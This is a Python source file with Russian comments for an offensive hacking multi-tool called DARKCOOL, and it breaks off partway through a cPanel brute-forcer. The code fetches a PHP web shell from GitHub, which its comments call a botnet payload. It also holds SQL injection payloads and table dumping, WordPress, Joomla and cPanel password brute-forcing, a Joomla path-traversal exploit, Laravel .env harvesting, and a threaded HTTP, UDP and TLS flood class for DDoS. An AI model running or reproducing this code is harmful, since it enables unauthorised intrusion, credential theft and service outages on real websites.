#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# ============================================================
# DARKCOOL - ПОЛНЫЙ ИСХОДНЫЙ КОД
# Версия: 3.11.6
# Автор: Dymles Ganz
# Telegram: https://t.me/DymlesCode
# Github: https://github.com/DarkSkull777
# ============================================================

import requests
import os
import sys
import time
import json
import re
import socket
import subprocess
import threading
import urllib3
import hashlib
import base64
import random
import string
from urllib.parse import urlparse, urljoin
from datetime import datetime
import concurrent.futures
import queue

# Отключаем предупреждения SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================
# ГЛОБАЛЬНЫЕ КОНСТАНТЫ
# ============================================================

VERSION = "3.11.6"
AUTHOR = "Dymles Ganz"
TELEGRAM = "https://t.me/DymlesCode"
GITHUB = "https://github.com/DarkSkull777"
PREMIUM = False  # False для обычных пользователей

# User-Agent для запросов
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36"
]

# URL для загрузки дополнительного payload (ботнет)
PAYLOAD_URL = "https://raw.githubusercontent.com/0x5a455553/MARIJUANA/master/MARIJUANA.php"

# Цвета для вывода
COLORS = {
    'red': '\033[91m',
    'green': '\033[92m',
    'yellow': '\033[93m',
    'blue': '\033[94m',
    'magenta': '\033[95m',
    'cyan': '\033[96m',
    'white': '\033[97m',
    'reset': '\033[0m'
}

# ============================================================
# БАННЕР И ИНТЕРФЕЙС
# ============================================================

BANNER = """
# ================================================================= #
# ==DDDDDDD===================DD=======DDDDD===================DD== #
# ==DD====DD==================DD======DD===DD==================DD== #
# ==DD====DD==================DD=====DD========================DD== #
# ==DD====DD===DDD===DD=DDD===DD=DD==DD=========DDDD====DDDD===DD== #
# ==DD====DD==DD=DD==DDDD=DD==DDDD===DD========DD==DD==DD==DD==DD== #
# ==DD====DD=====DD==DD=======DDD====DD========DD==DD==DD==DD==DD== #
# ==DD====DD===DDDD==DD=======DDDD===DD========DD==DD==DD==DD==DD== #
# ==DD====DD==DD=DD==DD=======DD=DD===DD===DD==DD==DD==DD==DD==DD== #
# ==DDDDDDD====DDDD==DD=======DD=DD====DDDDD====DDDD====DDDD===DD== #
# ================================================================= #
# ==                                                             == #
# == Author    : Dymles Ganz                                     == #
# == Telegram  : https://t.me/DymlesCode                         == #
# == Github    : https://github.com/DarkSkull777                 == #
# == Contact?  : Typing 0 in Menu                                == #
# ==                                                             == #
# =                                                               = #
"""

def clear_screen():
    """Очистка экрана"""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_color(text, color=None):
    """Цветной вывод"""
    if color and color in COLORS:
        print(f"{COLORS[color]}{text}{COLORS['reset']}")
    else:
        print(text)

def loading_animation(text="Loading", duration=1):
    """Анимация загрузки"""
    for _ in range(int(duration * 4)):
        for char in "|/-\\":
            sys.stdout.write(f"\r{text} {char}")
            sys.stdout.flush()
            time.sleep(0.25)
    sys.stdout.write("\r" + " " * (len(text) + 10) + "\r")

# ============================================================
# ОСНОВНЫЕ ФУНКЦИИ
# ============================================================

def check_internet():
    """Проверка интернет-соединения"""
    try:
        requests.get('https://api64.ipify.org', timeout=3)
        return True
    except:
        return False

def get_external_ip():
    """Получение внешнего IP"""
    try:
        r = requests.get('https://api64.ipify.org?format=json', timeout=5)
        return r.json().get('ip', 'Unknown')
    except:
        return None

def download_payload():
    """Загрузка основного payload (ботнет)"""
    try:
        print("[*] Downloading additional modules...")
        headers = {'User-Agent': random.choice(USER_AGENTS)}
        r = requests.get(PAYLOAD_URL, headers=headers, timeout=10, verify=False)
        if r.status_code == 200:
            with open('MARIJUANA.php', 'wb') as f:
                f.write(r.content)
            print("[+] Modules downloaded successfully")
            return True
        else:
            print(f"[-] Server returned {r.status_code}")
    except Exception as e:
        print(f"[-] Download failed: {e}")
    return False

def check_premium():
    """Проверка премиум-статуса"""
    # В реальности здесь была бы проверка на сервере
    return PREMIUM

def save_result(filename, content, mode='w'):
    """Сохранение результата в файл"""
    try:
        with open(filename, mode, encoding='utf-8') as f:
            f.write(content)
        return True
    except:
        return False

def read_file_lines(filename):
    """Чтение строк из файла"""
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

# ============================================================
# HTTP ФУНКЦИИ
# ============================================================

def make_request(url, method='GET', headers=None, data=None, timeout=10, verify=False):
    """Универсальная функция для HTTP запросов"""
    if headers is None:
        headers = {'User-Agent': random.choice(USER_AGENTS)}
    try:
        if method.upper() == 'GET':
            r = requests.get(url, headers=headers, timeout=timeout, verify=verify)
        elif method.upper() == 'POST':
            r = requests.post(url, headers=headers, data=data, timeout=timeout, verify=verify)
        else:
            r = requests.request(method, url, headers=headers, data=data, timeout=timeout, verify=verify)
        return r
    except:
        return None

def get_status_code(url):
    """Получение HTTP статуса"""
    r = make_request(url)
    if r:
        return r.status_code
    return None

def get_page_title(url):
    """Получение заголовка страницы"""
    r = make_request(url)
    if r and r.status_code == 200:
        match = re.search(r'<title>(.*?)</title>', r.text, re.IGNORECASE | re.DOTALL)
        if match:
            return match.group(1).strip()
    return None

def get_country_from_ip(ip):
    """Определение страны по IP"""
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        if r.status_code == 200:
            data = r.json()
            if data.get('status') == 'success':
                return f"{data.get('country', 'Unknown')}, {data.get('city', 'Unknown')}"
    except:
        pass
    return "Unknown"# ============================================================
# ИНСТРУМЕНТЫ ДЛЯ РАБОТЫ С ФАЙЛАМИ
# ============================================================

def combine_files(file1, file2, output):
    """Объединение двух файлов в один"""
    try:
        content = []
        with open(file1, 'r', encoding='utf-8', errors='ignore') as f:
            content.extend(f.readlines())
        with open(file2, 'r', encoding='utf-8', errors='ignore') as f:
            content.extend(f.readlines())
        
        with open(output, 'w', encoding='utf-8') as f:
            f.writelines(content)
        return True, len(content)
    except Exception as e:
        return False, str(e)

def remove_duplicates(input_file, output_file):
    """Удаление дубликатов из файла"""
    try:
        lines = read_file_lines(input_file)
        unique = []
        seen = set()
        for line in lines:
            if line not in seen:
                unique.append(line)
                seen.add(line)
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write('\n'.join(unique))
        return True, len(lines) - len(unique)
    except Exception as e:
        return False, str(e)

def add_text_to_lines(input_file, text, position='front', output_file=None):
    """Добавление текста в начало или конец каждой строки"""
    try:
        lines = read_file_lines(input_file)
        if position == 'front':
            new_lines = [f"{text}{line}" for line in lines]
        else:
            new_lines = [f"{line}{text}" for line in lines]
        
        out = output_file if output_file else input_file
        with open(out, 'w', encoding='utf-8') as f:
            f.write('\n'.join(new_lines))
        return True, len(lines)
    except Exception as e:
        return False, str(e)

def count_lines(filename):
    """Подсчет количества строк в файле"""
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            return len(f.readlines())
    except:
        return 0

# ============================================================
# СЕТЕВЫЕ ИНСТРУМЕНТЫ
# ============================================================

def ping_host(host, count=4):
    """Пинг хоста"""
    try:
        param = '-n' if os.name == 'nt' else '-c'
        result = subprocess.run(
            ['ping', param, str(count), host],
            capture_output=True,
            text=True,
            timeout=30
        )
        return result.stdout
    except:
        return "Ping failed"

def port_scan(host, ports):
    """Сканирование портов"""
    open_ports = []
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((host, port))
            if result == 0:
                open_ports.append(port)
            sock.close()
        except:
            pass
    return open_ports

def get_whois(domain):
    """Получение WHOIS информации (упрощенно)"""
    try:
        # Используем публичное API
        r = requests.get(f"https://api.domaintools.com/v1/{domain}/whois/", timeout=10)
        if r.status_code == 200:
            return r.text
    except:
        pass
    return "WHOIS data unavailable"

def get_dns_history(domain):
    """История DNS записей"""
    try:
        r = requests.get(f"https://api.securitytrails.com/v1/history/{domain}/dns/a", 
                        timeout=10)
        if r.status_code == 200:
            return r.json()
    except:
        pass
    return None

def reverse_ip(ip):
    """Поиск доменов на одном IP"""
    try:
        r = requests.get(f"https://api.hackertarget.com/reverseiplookup/?q={ip}", timeout=10)
        if r.status_code == 200:
            return r.text.split('\n')
    except:
        pass
    return []

def get_subdomains(domain):
    """Поиск поддоменов"""
    subdomains = []
    try:
        # Используем crt.sh
        r = requests.get(f"https://crt.sh/?q=%25.{domain}&output=json", timeout=10)
        if r.status_code == 200:
            data = r.json()
            for item in data:
                name = item.get('name_value', '')
                if name:
                    subdomains.extend(name.split('\n'))
        return list(set(subdomains))
    except:
        return []

# ============================================================
# ГРАББЕРЫ
# ============================================================

def grab_emails_from_page(url):
    """Сбор email-адресов со страницы"""
    try:
        r = make_request(url)
        if r and r.status_code == 200:
            emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', r.text)
            return list(set(emails))
    except:
        pass
    return []

def grab_links_from_page(url):
    """Сбор всех ссылок со страницы"""
    try:
        r = make_request(url)
        if r and r.status_code == 200:
            links = re.findall(r'href=[\'"]?([^\'" >]+)', r.text)
            full_links = []
            for link in links:
                if link.startswith('http'):
                    full_links.append(link)
                elif link.startswith('/'):
                    parsed = urlparse(url)
                    full_links.append(f"{parsed.scheme}://{parsed.netloc}{link}")
                elif link.startswith('#'):
                    continue
                else:
                    full_links.append(urljoin(url, link))
            return list(set(full_links))
    except:
        pass
    return []

def grab_images_from_page(url):
    """Сбор ссылок на изображения"""
    try:
        r = make_request(url)
        if r and r.status_code == 200:
            images = re.findall(r'<img[^>]+src=[\'"]([^\'"]+)[\'"]', r.text)
            return list(set(images))
    except:
        pass
    return []

# ============================================================
# ПОИСКОВЫЕ СИСТЕМЫ
# ============================================================

def google_search(query, pages=1, user_agent=None):
    """Поиск через Google"""
    results = []
    headers = {'User-Agent': user_agent if user_agent else random.choice(USER_AGENTS)}
    
    for page in range(pages):
        start = page * 10
        url = f"https://www.google.com/search?q={query}&start={start}"
        try:
            r = requests.get(url, headers=headers, timeout=10)
            if r.status_code == 200:
                # Парсим ссылки
                links = re.findall(r'<a[^>]+href="([^"]+)"', r.text)
                for link in links:
                    if link.startswith('/url?q='):
                        real_url = link.split('/url?q=')[1].split('&')[0]
                        if real_url.startswith('http'):
                            results.append(real_url)
        except:
            pass
        time.sleep(1)
    
    return list(set(results))

def bing_search(query, pages=1):
    """Поиск через Bing"""
    results = []
    for page in range(pages):
        first = page * 10 + 1
        url = f"https://www.bing.com/search?q={query}&first={first}"
        try:
            r = make_request(url)
            if r and r.status_code == 200:
                links = re.findall(r'<a[^>]+href="([^"]+)"', r.text)
                for link in links:
                    if link.startswith('http') and 'bing' not in link:
                        results.append(link)
        except:
            pass
        time.sleep(1)
    
    return list(set(results))

def yandex_search(query, pages=1):
    """Поиск через Yandex"""
    results = []
    for page in range(pages):
        p = page * 10
        url = f"https://yandex.ru/search/?text={query}&p={p}"
        try:
            r = make_request(url)
            if r and r.status_code == 200:
                links = re.findall(r'<a[^>]+href="([^"]+)"', r.text)
                for link in links:
                    if link.startswith('http') and 'yandex' not in link:
                        results.append(link)
        except:
            pass
        time.sleep(1)
    
    return list(set(results))

# ============================================================
# ГРАББЕР ДОМЕНОВ
# ============================================================

def grab_domains_random(pages=5):
    """Граббер случайных доменов"""
    domains = []
    sources = [
        "https://www.domcop.com/top-10-million-websites",
        "https://www.alexa.com/topsites",
        "https://www.similarweb.com/top-websites/"
    ]
    
    for url in sources:
        try:
            r = make_request(url)
            if r and r.status_code == 200:
                found = re.findall(r'([a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9]\.[a-zA-Z]{2,})', r.text)
                domains.extend(found[:100])
        except:
            pass
    
    return list(set(domains))

def grab_domains_by_extension(ext, pages=5):
    """Граббер доменов по расширению (.com, .org, etc)"""
    domains = []
    dorks = [
        f'site:.{ext}',
        f'inurl:.{ext}',
        f'filetype:php site:.{ext}'
    ]
    
    for dork in dorks:
        results = google_search(dork, pages=pages)
        for url in results:
            parsed = urlparse(url)
            domain = parsed.netloc
            if domain.endswith(f'.{ext}'):
                domains.append(domain)
    
    return list(set(domains))# ============================================================
# SQL INJECTION ИНСТРУМЕНТЫ
# ============================================================

def check_sql_injection(url, param):
    """Проверка на SQL-уязвимость"""
    payloads = [
        "'",
        "\"",
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' UNION SELECT NULL--",
        "1' ORDER BY 1--",
        "1' GROUP BY 1--",
        "' AND 1=1--",
        "' AND 1=2--"
    ]
    
    vulnerable = False
    error_patterns = [
        "sql",
        "mysql",
        "sqlite",
        "postgresql",
        "oracle",
        "db_error",
        "driver",
        "db2",
        "microsoft.*odbc",
        "syntax.*error"
    ]
    
    for payload in payloads:
        test_url = url.replace(param, f"{param}={payload}")
        try:
            r = make_request(test_url)
            if r and r.status_code == 200:
                content = r.text.lower()
                for pattern in error_patterns:
                    if re.search(pattern, content, re.IGNORECASE):
                        vulnerable = True
                        break
        except:
            pass
    
    return vulnerable

def order_by_scan(url, param, max_columns=20):
    """Определение количества колонок через ORDER BY"""
    for i in range(1, max_columns + 1):
        payload = f"{param}=1' ORDER BY {i}--"
        test_url = url.replace(param, payload)
        try:
            r = make_request(test_url)
            if r and r.status_code == 500 or (r and 'error' in r.text.lower()):
                return i - 1
        except:
            pass
    return 0

def union_select_scan(url, param, columns):
    """UNION SELECT для получения данных"""
    results = []
    
    # Получаем версию БД
    version_payloads = [
        f"{param}=-1' UNION SELECT {','.join(['NULL'] * columns)}--",
        f"{param}=-1' UNION SELECT {','.join(['NULL'] * columns)} FROM information_schema.tables--"
    ]
    
    for payload in version_payloads:
        test_url = url.replace(param, payload)
        try:
            r = make_request(test_url)
            if r and r.status_code == 200:
                # Парсим результат
                results.append(r.text[:500])
        except:
            pass
    
    return results

def dump_tables(url, param, columns):
    """Дамп таблиц через DIOS"""
    results = []
    
    # DIOS для MySQL
    dios = f"{param}=-1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50--"
    
    # Адаптируем под количество колонок
    cols = ','.join([str(i) for i in range(1, columns + 1)])
    dios = f"{param}=-1' UNION SELECT {cols}--"
    
    test_url = url.replace(param, dios)
    try:
        r = make_request(test_url)
        if r and r.status_code == 200:
            results.append(r.text[:1000])
    except:
        pass
    
    return results

# ============================================================
# WORDPRESS ИНСТРУМЕНТЫ
# ============================================================

def detect_wordpress(url):
    """Определение WordPress"""
    indicators = [
        "/wp-content/",
        "/wp-includes/",
        "/wp-admin/",
        "wp-json",
        "xmlrpc.php",
        "wp-login.php"
    ]
    
    for indicator in indicators:
        test_url = urljoin(url, indicator)
        try:
            r = make_request(test_url)
            if r and r.status_code == 200:
                return True
        except:
            pass
    return False

def detect_theme(url):
    """Определение темы WordPress"""
    try:
        r = make_request(url)
        if r and r.status_code == 200:
            # Ищем пути к темам
            themes = re.findall(r'/wp-content/themes/([^/]+)', r.text)
            if themes:
                return list(set(themes))
    except:
        pass
    return []

def detect_plugins(url):
    """Определение плагинов WordPress"""
    plugins = []
    common_plugins = [
        "akismet", "jetpack", "wordfence", "yoast", "wp-super-cache",
        "w3-total-cache", "contact-form-7", "elementor", "woocommerce",
        "wpforms", "all-in-one-seo-pack", "google-analytics"
    ]
    
    for plugin in common_plugins:
        test_url = urljoin(url, f"/wp-content/plugins/{plugin}/")
        try:
            r = make_request(test_url)
            if r and r.status_code == 200:
                plugins.append(plugin)
        except:
            pass
    
    return plugins

def wp_admin_bruteforce(url, userlist, passlist, threads=5):
    """Брутфорс WordPress admin"""
    results = []
    
    def try_login(username, password):
        login_url = urljoin(url, "wp-login.php")
        data = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'testcookie': '1'
        }
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Referer': login_url
        }
        
        try:
            r = requests.post(login_url, data=data, headers=headers, allow_redirects=False, timeout=10)
            if r.status_code == 302 and 'wp-admin' in r.headers.get('Location', ''):
                return True, username, password
        except:
            pass
        return False, username, password
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for user in userlist:
            for passwd in passlist[:10]:  # Ограничим для примера
                futures.append(executor.submit(try_login, user, passwd))
        
        for future in concurrent.futures.as_completed(futures):
            success, user, pwd = future.result()
            if success:
                results.append((user, pwd))
    
    return results

# ============================================================
# JOOMLA ИНСТРУМЕНТЫ
# ============================================================

def detect_joomla(url):
    """Определение Joomla"""
    indicators = [
        "/administrator/",
        "/components/",
        "/modules/",
        "/templates/",
        "/plugins/",
        "/media/system/js/"
    ]
    
    for indicator in indicators:
        test_url = urljoin(url, indicator)
        try:
            r = make_request(test_url)
            if r and r.status_code == 200:
                return True
        except:
            pass
    return False

def joomla_version(url):
    """Определение версии Joomla"""
    try:
        r = make_request(urljoin(url, "administrator/manifests/files/joomla.xml"))
        if r and r.status_code == 200:
            version = re.search(r'<version>(.*?)</version>', r.text)
            if version:
                return version.group(1)
    except:
        pass
    
    try:
        r = make_request(urljoin(url, "language/en-GB/en-GB.xml"))
        if r and r.status_code == 200:
            version = re.search(r'<version>(.*?)</version>', r.text)
            if version:
                return version.group(1)
    except:
        pass
    
    return "Unknown"

def joomla_com_myblog_exploit(url):
    """Эксплойт для com_myblog"""
    payloads = [
        "/index.php?option=com_myblog&Itemid=1&task=upload&myblog_upload_dir=../../../../",
        "/index.php?option=com_myblog&Itemid=1&task=upload&myblog_upload_dir=../../../../tmp/"
    ]
    
    for payload in payloads:
        test_url = urljoin(url, payload)
        try:
            r = make_request(test_url)
            if r and r.status_code == 200:
                return True
        except:
            pass
    return False

# ============================================================
# LARAVEL ИНСТРУМЕНТЫ
# ============================================================

def detect_laravel(url):
    """Определение Laravel"""
    indicators = [
        "/vendor/",
        "/storage/",
        "/bootstrap/",
        "laravel_session",
        "XSRF-TOKEN"
    ]
    
    try:
        r = make_request(url)
        if r:
            headers = r.headers
            cookies = r.cookies
            
            for indicator in indicators:
                if indicator in str(headers) or indicator in str(cookies):
                    return True
    except:
        pass
    
    return False

def laravel_env_file(url):
    """Поиск .env файла Laravel"""
    env_paths = [
        "/.env",
        "/.env.example",
        "/.env.local",
        "/.env.development",
        "/.env.production",
        "/storage/.env"
    ]
    
    for path in env_paths:
        test_url = urljoin(url, path)
        try:
            r = make_request(test_url)
            if r and r.status_code == 200 and 'APP_KEY' in r.text:
                return True, test_url, r.text[:500]
        except:
            pass
    
    return False, None, None

def laravel_debug_mode(url):
    """Проверка debug mode"""
    test_urls = [
        "/_debugbar/open",
        "/_ignition/execute-solution",
        "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
    ]
    
    for test_url in test_urls:
        full_url = urljoin(url, test_url)
        try:
            r = make_request(full_url)
            if r and r.status_code == 200:
                return True, full_url
        except:
            pass
    
    return False, None# ============================================================
# DDoS ИНСТРУМЕНТЫ
# ============================================================

class DDoSAttack:
    """Класс для DDoS атак"""
    
    def __init__(self, target, method='HTTP', threads=100):
        self.target = target
        self.method = method
        self.threads = threads
        self.running = False
        self.stats = {'sent': 0, 'failed': 0}
    
    def http_flood(self):
        """HTTP флуд"""
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        }
        
        while self.running:
            try:
                r = requests.get(self.target, headers=headers, timeout=5, verify=False)
                self.stats['sent'] += 1
            except:
                self.stats['failed'] += 1
    
    def https_flood(self):
        """HTTPS флуд"""
        self.http_flood()  # аналогично, но с verify=False
    
    def udp_flood(self):
        """UDP флуд"""
        parsed = urlparse(self.target)
        host = parsed.netloc or parsed.path
        port = 80
        
        if ':' in host:
            host, port_str = host.split(':')
            port = int(port_str)
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        while self.running:
            try:
                data = random._urandom(1024)
                sock.sendto(data, (host, port))
                self.stats['sent'] += 1
            except:
                self.stats['failed'] += 1
    
    def tls_flood(self):
        """TLS флуд (требует ssl)"""
        import ssl
        
        parsed = urlparse(self.target)
        host = parsed.netloc or parsed.path
        port = 443
        
        if ':' in host:
            host, port_str = host.split(':')
            port = int(port_str)
        
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((host, port))
                
                # TLS handshake
                context = ssl.create_default_context()
                ssl_sock = context.wrap_socket(sock, server_hostname=host)
                ssl_sock.close()
                
                self.stats['sent'] += 1
            except:
                self.stats['failed'] += 1
            finally:
                try:
                    sock.close()
                except:
                    pass
    
    def start(self, duration=60):
        """Запуск атаки"""
        self.running = True
        
        method_map = {
            'HTTP': self.http_flood,
            'HTTPS': self.https_flood,
            'UDP': self.udp_flood,
            'TLS': self.tls_flood
        }
        
        attack_func = method_map.get(self.method.upper(), self.http_flood)
        
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=attack_func)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Статистика
        start_time = time.time()
        while time.time() - start_time < duration:
            print(f"\r[+] Sent: {self.stats['sent']} | Failed: {self.stats['failed']} | Time: {int(time.time() - start_time)}s", end='')
            time.sleep(1)
        
        self.running = False
        print(f"\n[+] Attack finished. Total sent: {self.stats['sent']}")
        
        return self.stats

# ============================================================
# ВЕБ-ШЕЛЛ ФАЙНДЕР
# ============================================================

def find_webshells(base_url, wordlist=None):
    """Поиск веб-шеллов на сайте"""
    if wordlist is None:
        wordlist = [
            'shell.php', 'shell.asp', 'shell.aspx', 'shell.jsp',
            'cmd.php', 'cmd.asp', 'cmd.aspx', 'cmd.jsp',
            'backdoor.php', 'backdoor.asp', 'backdoor.aspx', 'backdoor.jsp',
            'r57.php', 'c99.php', 'b374k.php', 'wso.php',
            'webshell.php', 'webshell.asp', 'webshell.aspx', 'webshell.jsp',
            'uploads/shell.php', 'images/shell.php', 'tmp/shell.php',
            'admin/shell.php', 'include/shell.php', 'modules/shell.php'
        ]
    
    found = []
    
    for path in wordlist:
        test_url = urljoin(base_url, path)
        try:
            r = make_request(test_url)
            if r and r.status_code == 200:
                # Проверяем признаки шелла
                content = r.text.lower()
                indicators = ['cmd', 'shell', 'exec', 'system', 'passthru', 'backdoor']
                for ind in indicators:
                    if ind in content:
                        found.append((test_url, 'Possible webshell'))
                        break
        except:
            pass
    
    return found

def scan_laravel_paths(base_url):
    """Сканирование Laravel путей"""
    paths = [
        'storage/logs/laravel.log',
        'storage/framework/cache/data/',
        'storage/framework/sessions/',
        'storage/framework/views/',
        'bootstrap/cache/config.php',
        'bootstrap/cache/packages.php',
        'bootstrap/cache/services.php',
        '.env',
        'public/storage',
        'vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
    ]
    
    found = []
    for path in paths:
        test_url = urljoin(base_url, path)
        try:
            r = make_request(test_url)
            if r and r.status_code == 200:
                found.append((test_url, 'Exists'))
        except:
            pass
    
    return found

def scan_wordpress_paths(base_url):
    """Сканирование WordPress путей"""
    paths = [
        'wp-content/uploads/',
        'wp-content/plugins/',
        'wp-content/themes/',
        'wp-includes/',
        'wp-admin/',
        'wp-config.php',
        'xmlrpc.php',
        'wp-login.php',
        'wp-json/',
        'wp-content/debug.log'
    ]
    
    found = []
    for path in paths:
        test_url = urljoin(base_url, path)
        try:
            r = make_request(test_url)
            if r and r.status_code == 200:
                found.append((test_url, 'Exists'))
        except:
            pass
    
    return found

# ============================================================
# ГЕОЛОКАЦИЯ И ТРЕКИНГ
# ============================================================

def track_ip(ip):
    """Отслеживание IP адреса"""
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        if r.status_code == 200:
            data = r.json()
            if data.get('status') == 'success':
                return {
                    'ip': ip,
                    'country': data.get('country', 'Unknown'),
                    'region': data.get('regionName', 'Unknown'),
                    'city': data.get('city', 'Unknown'),
                    'zip': data.get('zip', 'Unknown'),
                    'lat': data.get('lat', 0),
                    'lon': data.get('lon', 0),
                    'isp': data.get('isp', 'Unknown'),
                    'org': data.get('org', 'Unknown'),
                    'as': data.get('as', 'Unknown'),
                    'timezone': data.get('timezone', 'Unknown')
                }
    except:
        pass
    return None

def get_weather(city):
    """Получение погоды для города"""
    try:
        # Используем бесплатное API
        url = f"https://wttr.in/{city}?format=j1"
        r = requests.get(url, timeout=5)
        if r.status_code == 200:
            data = r.json()
            current = data.get('current_condition', [{}])[0]
            return {
                'city': city,
                'temp': current.get('temp_C', 'Unknown'),
                'feels': current.get('FeelsLikeC', 'Unknown'),
                'humidity': current.get('humidity', 'Unknown'),
                'wind': current.get('windspeedKmph', 'Unknown'),
                'description': current.get('weatherDesc', [{}])[0].get('value', 'Unknown')
            }
    except:
        pass
    return None

# ============================================================
# СОЦИАЛЬНЫЕ СЕТИ
# ============================================================

def instagram_info(username):
    """Получение информации об Instagram аккаунте"""
    try:
        url = f"https://www.instagram.com/{username}/?__a=1&__d=dis"
        headers = {'User-Agent': random.choice(USER_AGENTS)}
        r = requests.get(url, headers=headers, timeout=10)
        if r.status_code == 200:
            data = r.json()
            user = data.get('graphql', {}).get('user', {})
            return {
                'username': username,
                'full_name': user.get('full_name', 'Unknown'),
                'bio': user.get('biography', 'Unknown'),
                'followers': user.get('edge_followed_by', {}).get('count', 0),
                'following': user.get('edge_follow', {}).get('count', 0),
                'posts': user.get('edge_owner_to_timeline_media', {}).get('count', 0),
                'private': user.get('is_private', False),
                'verified': user.get('is_verified', False)
            }
    except:
        pass
    return None

def search_social_media(username):
    """Поиск аккаунта в соцсетях по username"""
    results = {}
    
    platforms = {
        'instagram': f"https://www.instagram.com/{username}/",
        'twitter': f"https://twitter.com/{username}",
        'facebook': f"https://www.facebook.com/{username}",
        'tiktok': f"https://www.tiktok.com/@{username}",
        'youtube': f"https://www.youtube.com/@{username}",
        'github': f"https://github.com/{username}",
        'telegram': f"https://t.me/{username}",
        'reddit': f"https://www.reddit.com/user/{username}",
        'pinterest': f"https://www.pinterest.com/{username}",
        'snapchat': f"https://www.snapchat.com/add/{username}"
    }
    
    for platform, url in platforms.items():
        try:
            r = make_request(url, timeout=3)
            if r and r.status_code == 200:
                results[platform] = url
        except:
            pass
    
    return results# ============================================================
# БРУТФОРС ИНСТРУМЕНТЫ
# ============================================================

class Bruteforce:
    """Базовый класс для брутфорса"""
    
    def __init__(self, target, wordlist=None, threads=10):
        self.target = target
        self.wordlist = wordlist or self.default_wordlist()
        self.threads = threads
        self.found = []
        self.queue = queue.Queue()
    
    def default_wordlist(self):
        """Стандартный список паролей"""
        return [
            'admin', 'password', '123456', '12345678', '1234',
            'qwerty', 'abc123', 'password1', 'admin123', 'root',
            'toor', 'test', 'guest', 'user', 'letmein',
            'welcome', 'monkey', 'dragon', 'master', 'hello',
            'freedom', 'whatever', 'qazwsx', 'trustno1', 'pass'
        ]
    
    def worker(self):
        """Рабочий поток"""
        while not self.queue.empty():
            try:
                item = self.queue.get_nowait()
                result = self.try_login(item)
                if result:
                    self.found.append(result)
                self.queue.task_done()
            except:
                break
    
    def try_login(self, item):
        """Должен быть переопределен"""
        return None
    
    def start(self):
        """Запуск брутфорса"""
        for item in self.wordlist:
            self.queue.put(item)
        
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=self.worker)
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join()
        
        return self.found


class WordPressBruteforce(Bruteforce):
    """Брутфорс WordPress"""
    
    def try_login(self, password):
        login_url = urljoin(self.target, 'wp-login.php')
        data = {
            'log': 'admin',
            'pwd': password,
            'wp-submit': 'Log In',
            'redirect_to': urljoin(self.target, 'wp-admin/'),
            'testcookie': '1'
        }
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Referer': login_url
        }
        
        try:
            r = requests.post(login_url, data=data, headers=headers, 
                             allow_redirects=False, timeout=5)
            if r.status_code == 302 and 'wp-admin' in r.headers.get('Location', ''):
                return ('admin', password)
        except:
            pass
        return None


class JoomlaBruteforce(Bruteforce):
    """Брутфорс Joomla"""
    
    def try_login(self, password):
        login_url = urljoin(self.target, 'administrator/index.php')
        data = {
            'username': 'admin',
            'passwd': password,
            'option': 'com_login',
            'task': 'login',
            'return': 'aW5kZXgucGhw'
        }
        
        try:
            r = requests.post(login_url, data=data, timeout=5, allow_redirects=False)
            if r.status_code == 303 or 'administrator' in r.text:
                return ('admin', password)
        except:
            pass
        return None


class CPanelBruteforce(Bruteforce):
    """Брутфорс CPanel"""
    
    def try_login(self, password):
        login_url = urljoin(self.target, ':2083/login/')
        data = {
            'user': 'root',
            'pass': password,
            'login': 'Login'
        }
        
        try:
            r = requests.post(login_url, data=data, timeout=5, verify=False)
